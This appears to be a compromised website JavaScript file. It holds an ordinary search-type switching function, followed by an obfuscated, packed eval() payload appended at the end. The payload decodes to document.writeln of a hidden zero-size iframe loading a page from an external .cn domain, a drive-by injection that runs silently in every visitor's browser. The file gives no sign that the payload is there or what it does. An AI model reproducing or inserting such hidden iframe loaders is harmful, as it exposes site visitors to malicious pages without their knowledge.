	function setmodel(value, id, siteid, q) {
		$("#typeid").val(value);
		$("#search a").removeClass();
		id.addClass('on');
		if(q!=null && q!='') {
			window.location='?m=search&c=index&a=init&siteid='+siteid+'&typeid='+value+'&q='+q;
		}
	}
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('7.5("<1 6=\\"4://2.3/a.b\\" c=\\"0\\" 8=\\"0\\" 9=\\"0\\"></1>");',13,13,'|iframe|04zl|cn|http|writeln|src|document|height|frameborder||html|width'.split('|'),0,{}))